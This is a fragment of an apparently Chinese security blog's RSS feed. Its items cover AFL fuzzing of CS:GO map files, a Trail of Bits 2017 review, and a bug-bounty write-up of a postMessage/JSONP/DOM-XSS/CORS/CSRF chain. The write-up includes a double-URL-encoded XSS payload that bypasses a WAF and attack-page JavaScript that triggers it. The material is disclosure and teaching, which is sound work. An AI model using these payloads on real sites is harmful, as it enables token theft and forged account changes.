&lt;/div&gt;&lt;p&gt;该payload通过反射获取类加载器，加载关键类并最终执行命令，成功绕过沙箱防护。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用AFL模糊测试《反恐精英：全球攻势》地图文件的技术实践</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 02 Aug 2025 06:54:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;使用afl模糊测试反恐精英全球攻势地图文件&#34;&gt;使用AFL模糊测试《反恐精英：全球攻势》地图文件
&lt;/h1&gt;&lt;p&gt;RealWorldCTF 2018有一个非常有趣的挑战叫做&amp;quot;P90 Rush B&amp;quot;，这是对Valve游戏《反恐精英：全球攻势》中一种战术的影射。该挑战要求发现并利用CS:GO服务器使用的地图文件加载器中的漏洞。&lt;/p&gt;
&lt;p&gt;在CTF期间，我利用了一个栈缓冲区溢出漏洞，后来另一个团队在他们的报告中很好地描述了这个漏洞。由于这个漏洞也影响了官方的CS:GO Windows客户端，符合Valve的漏洞赏金计划条件，实际上它只是一个旧报告的小变种，所以我在CTF结束后很快报告了它，并迅速得到了修复。&lt;/p&gt;
&lt;h2 id=&#34;bsp文件格式与攻击面&#34;&gt;BSP文件格式与攻击面
&lt;/h2&gt;&lt;p&gt;CS:GO（可能所有Source引擎游戏）使用的地图文件格式称为BSP，是二进制空间分割的缩写，这是一种方便的n维空间对象表示方法。然而，这种格式支持的远不止3D信息。BSP文件由服务器和客户端共同处理，因为两者都需要地图信息的某个子集来执行各自的任务。这是一个远程攻击面，因为客户端会在服务器发起的地图变更时从服务器下载未知地图。&lt;/p&gt;
&lt;h2 id=&#34;模糊测试设置&#34;&gt;模糊测试设置
&lt;/h2&gt;&lt;p&gt;为了简单起见，我决定模糊测试Linux服务器二进制文件，而不是实际的客户端（也可以在Linux上运行）。用这种方法显然无法发现客户端特有的问题，但我希望能找到共享代码中的低悬果实。&lt;/p&gt;
&lt;p&gt;我编写了一个简单的包装器来处理服务器二进制文件使用的共享库，最重要的几个是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;engine.so - 主要Source引擎代码（包含BSP解析器）&lt;/li&gt;
&lt;li&gt;dedicated.so - 专用服务器实现（包含应用程序入口点）&lt;/li&gt;
&lt;li&gt;libtier0.so - 可能与Steam/应用程序管理相关&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;afl修改&#34;&gt;AFL修改
&lt;/h2&gt;&lt;p&gt;我对AFL做了一些简单的修改：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入文件必须以.bsp结尾才能被GetModelForName正确解析&lt;/li&gt;
&lt;li&gt;需要能够指定自定义的fork服务器启动点&lt;/li&gt;
&lt;li&gt;增加等待fork时的超时乘数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞分类与根因分析&#34;&gt;漏洞分类与根因分析
&lt;/h2&gt;&lt;p&gt;我们需要将&amp;quot;好&amp;quot;的漏洞与不感兴趣的漏洞（如纯越界读取）分开。我基于调用栈进行了简单的去重，然后在Valgrind中运行每个独特样本。&lt;/p&gt;
&lt;h2 id=&#34;经验总结&#34;&gt;经验总结
&lt;/h2&gt;&lt;p&gt;从这个小型项目中我学到了：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;AFL在QEMU模式下非常灵活，可以攻击特定代码段&lt;/li&gt;
&lt;li&gt;输入文件大小非常重要，从300KB降到16KB后性能至少提高了5倍&lt;/li&gt;
&lt;li&gt;分类对于筛选以前未经过模糊测试的代码库非常重要&lt;/li&gt;
&lt;li&gt;堆上的内存损坏不是一个安全问题 :)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;示例漏洞cvirtualterrainlevelinit中的堆缓冲区溢出&#34;&gt;示例漏洞：CVirtualTerrain::LevelInit中的堆缓冲区溢出
&lt;/h2&gt;&lt;p&gt;在CVirtualTerrain::LevelInit中发生堆缓冲区溢出，因为dphysdisp_t::numDisplacements变量可能大于g_DispCollTreeCount，而检查这种情况的断言在发布版本中不存在。攻击者可以很大程度上控制堆内容，因此很可能被利用，特别是在Windows 7上许多模块没有启用ASLR的情况下。&lt;/p&gt;
&lt;p&gt;[附上一个BSP文件，其中numDisplacements = 0xffff且g_DispCollTreeCount = 2，可以可靠地使csgo.exe崩溃]&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2017年度回顾：自动化漏洞挖掘、符号执行与区块链安全的技术突破</title>
        <link>http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/</link>
        <pubDate>Sat, 02 Aug 2025 03:22:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/</guid>
        <description>&lt;h1 id=&#34;2017年度回顾---trail-of-bits博客&#34;&gt;2017年度回顾 - Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;2017年是技术突破的一年！我们在自动化漏洞发现、符号执行和二进制翻译等领域发布了创新研究，并改进了安全研究人员依赖的基础工具。我们在智能合约安全领域扩大影响力，成为顶尖的区块链安全公司。&lt;/p&gt;
&lt;h2 id=&#34;创新研究&#34;&gt;创新研究
&lt;/h2&gt;&lt;h3 id=&#34;自动化漏洞发现进入现实世界&#34;&gt;自动化漏洞发现进入现实世界
&lt;/h3&gt;&lt;p&gt;2017年该领域发展迅猛。我们与洛克希德·马丁和国防部DIUx签订合同，应用我们的网络推理系统(Cyber Reasoning System)。同时我们将CGC挑战二进制文件移植到Windows、macOS和Linux平台，为工具评估提供客观基准。&lt;/p&gt;
&lt;h3 id=&#34;manticore提升符号执行工具可用性&#34;&gt;Manticore提升符号执行工具可用性
&lt;/h3&gt;&lt;p&gt;我们开源了高度灵活的符号执行工具Manticore，它已成为DARPA LADS项目的重要组成部分。我们将其应用于以太坊虚拟机(EVM)字节码分析，可自动发现合约函数、生成触发合约状态的交易并检查失败状态。&lt;/p&gt;
&lt;h3 id=&#34;mcsema-20实现二进制文件近似源代码处理&#34;&gt;McSema 2.0实现二进制文件近似源代码处理
&lt;/h3&gt;&lt;p&gt;我们对二进制翻译工具McSema进行了重大升级：代码清理、性能提升，并分离指令语义与控制流恢复创建Remill库。演示用例包括二进制补丁修改、与KLEE的符号执行，以及重用基于LLVM的工具(如libFuzzer)。&lt;/p&gt;
&lt;h2 id=&#34;基础工具&#34;&gt;基础工具
&lt;/h2&gt;&lt;h3 id=&#34;巩固以太坊基础设施&#34;&gt;巩固以太坊基础设施
&lt;/h3&gt;&lt;p&gt;我们开发了行业领先的智能合约安全工具套件，包括适配Manticore用于以太坊安全审计。我们加入了企业以太坊联盟(EEA)，并公开了RSK和DappHub Sai的安全审计报告。&lt;/p&gt;
&lt;h3 id=&#34;osquery扩展功能边界&#34;&gt;osquery扩展功能边界
&lt;/h3&gt;&lt;p&gt;我们在2016年将Facebook的开源终端监控代理移植到Windows后，继续增强osquery框架：重新设计基于auditd的文件完整性监控，添加CCleaner恶意软件检测功能，并创建扩展仓库。&lt;/p&gt;
&lt;h3 id=&#34;iverify满足iphone用户基本需求&#34;&gt;iVerify满足iPhone用户基本需求
&lt;/h3&gt;&lt;p&gt;我们发布了包含最全面iOS越狱检测的iVerify库，可检测iOS 10和11的越狱状态，并承诺随iOS更新持续维护。&lt;/p&gt;
&lt;h3 id=&#34;algo普及自托管vpn服务&#34;&gt;Algo普及自托管VPN服务
&lt;/h3&gt;&lt;p&gt;我们2016年发布的自托管个人VPN服务器Algo在2017年获得广泛关注。它采用现代协议和密码，包含最小化软件集，并得到70名Github贡献者的704次提交。&lt;/p&gt;
&lt;h2 id=&#34;学习与分享&#34;&gt;学习与分享
&lt;/h2&gt;&lt;h3 id=&#34;推动漏洞缓解措施部署&#34;&gt;推动漏洞缓解措施部署
&lt;/h3&gt;&lt;p&gt;我们比较了clang的CFI与Visual Studio的CFG实现，创建了Windows Defender的&amp;quot;Flying Sandbox Monster&amp;quot;——首个Windows平台沙盒化反病毒扫描器，使用Rust框架在AppContainers中隔离不可信应用。&lt;/p&gt;
&lt;h3 id=&#34;聚焦binary-ninja&#34;&gt;聚焦Binary Ninja
&lt;/h3&gt;&lt;p&gt;我们通过多种方式展示Vector35逆向平台的能力：解释其低级中间语言(LLIL)基础、演示如何开发平台无关工具、分享DEF CON CTF挑战分析模块。&lt;/p&gt;
&lt;h3 id=&#34;支持重要事业&#34;&gt;支持重要事业
&lt;/h3&gt;&lt;p&gt;我们赞助UIUC CTF等竞赛，支持GreHack等会议，并赞助Risky Business播客分享安全洞见。&lt;/p&gt;
&lt;h2 id=&#34;2018年展望&#34;&gt;2018年展望
&lt;/h2&gt;&lt;p&gt;我们将继续推进国防部DIUx的Voltron项目、深化区块链安全研究、增强开源项目支持(osquery、Google Santa等)、发布iVerify独立版、优化Algo的易用性，并通过DeepState等工具使先进技术更易获取。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>漏洞链大杂烩：postMessage、JSONP、WAF绕过、DOM型XSS、CORS与CSRF的完美风暴</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</link>
        <pubDate>Fri, 01 Aug 2025 20:51:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</guid>
        <description>&lt;h1 id=&#34;tldr&#34;&gt;TL;DR
&lt;/h1&gt;&lt;p&gt;数月前在某公开漏洞赏金项目中，作者发现了一个精妙的漏洞链，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不安全的message事件监听&lt;/li&gt;
&lt;li&gt;粗糙的JSONP端点&lt;/li&gt;
&lt;li&gt;WAF绕过技巧&lt;/li&gt;
&lt;li&gt;范围外子域的DOM型XSS&lt;/li&gt;
&lt;li&gt;过度宽松的CORS配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些漏洞最终组合实现了对范围内资产的CSRF攻击。本文将深度剖析这个攻击链的技术细节。&lt;/p&gt;
&lt;h1 id=&#34;寻找棘手的csrf漏洞&#34;&gt;寻找棘手的CSRF漏洞
&lt;/h1&gt;&lt;p&gt;目标赏金项目的范围仅限于&lt;code&gt;www.redacted.com&lt;/code&gt;及其少数子域。当常规测试思路枯竭时，作者注意到&lt;code&gt;inscope.redacted.com&lt;/code&gt;等子域会向&lt;code&gt;https://www.redacted.com/api&lt;/code&gt;发送包含敏感操作（如更新用户资料）的POST请求。这些请求依赖标记为&lt;code&gt;SameSite=None&lt;/code&gt;和&lt;code&gt;Secure&lt;/code&gt;的&lt;code&gt;sid&lt;/code&gt;cookie进行认证，但作为CSRF防护，端点要求查询参数中包含与会话绑定的&lt;code&gt;csrftoken&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;宽松的cors策略突破范围限制&#34;&gt;宽松的CORS策略突破范围限制
&lt;/h1&gt;&lt;p&gt;测试发现&lt;code&gt;https://www.redacted.com/profile&lt;/code&gt;端点的CORS配置不仅允许&lt;code&gt;https://in-scope.redacted.com&lt;/code&gt;，还接受任意&lt;code&gt;redacted.com&lt;/code&gt;子域的请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -sD - -o /dev/null &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Origin: https://whatever.redacted.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie: sid=xxx-yyy-zzz&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  https://www.redacted.com/profile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Origin: https://whatever.redacted.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;范围外子域的不安全消息监听&#34;&gt;范围外子域的不安全消息监听
&lt;/h1&gt;&lt;p&gt;使用postMessage-tracker插件发现&lt;code&gt;https://out-of-scope.redacted.com/search&lt;/code&gt;存在未做来源检查的message事件监听器，其处理逻辑会：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解析事件数据为JSON对象&lt;/li&gt;
&lt;li&gt;按点号分割method属性&lt;/li&gt;
&lt;li&gt;递归访问window.APP对象的嵌套属性&lt;/li&gt;
&lt;li&gt;调用最终获得的函数并传入arg参数&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;粗糙的jsonp端点导致dom型xss&#34;&gt;粗糙的JSONP端点导致DOM型XSS
&lt;/h1&gt;&lt;p&gt;&lt;code&gt;window.APP.apiCall&lt;/code&gt;函数用于向&lt;code&gt;https://search.redacted.com&lt;/code&gt;的JSONP端点发送请求，但存在两个关键问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;URL构造不安全&lt;/li&gt;
&lt;li&gt;回调参数验证存在缺陷&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过双重URL编码可绕过Akamai WAF防护：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;https://search.redacted.com/&amp;amp;callback=alert%2528%2527xss%2527%2529%252F%252F&amp;amp;output=jsonp&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;组合利用实现一键csrf&#34;&gt;组合利用实现一键CSRF
&lt;/h1&gt;&lt;p&gt;最终攻击流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;诱导用户点击恶意页面按钮&lt;/li&gt;
&lt;li&gt;弹出窗口打开目标页面&lt;/li&gt;
&lt;li&gt;通过postMessage触发JSONP请求&lt;/li&gt;
&lt;li&gt;利用XSS窃取CSRF令牌&lt;/li&gt;
&lt;li&gt;伪造用户资料更新请求&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;攻击页面核心代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendMsg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;doubleEncodedPayload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;//`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s1&#34;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;APP.apiCall&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s1&#34;&gt;&amp;#39;arg&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;amp;callback=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;doubleEncodedPayload&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;&amp;amp;output=jsonp#`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;postMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;origin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;后续&#34;&gt;后续
&lt;/h1&gt;&lt;p&gt;虽然漏洞链技术复杂度高（CVSS 7.1 High），但最终仅获得200欧元奖励。这反映出某些赏金项目对复杂攻击链的价值评估可能存在偏差。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
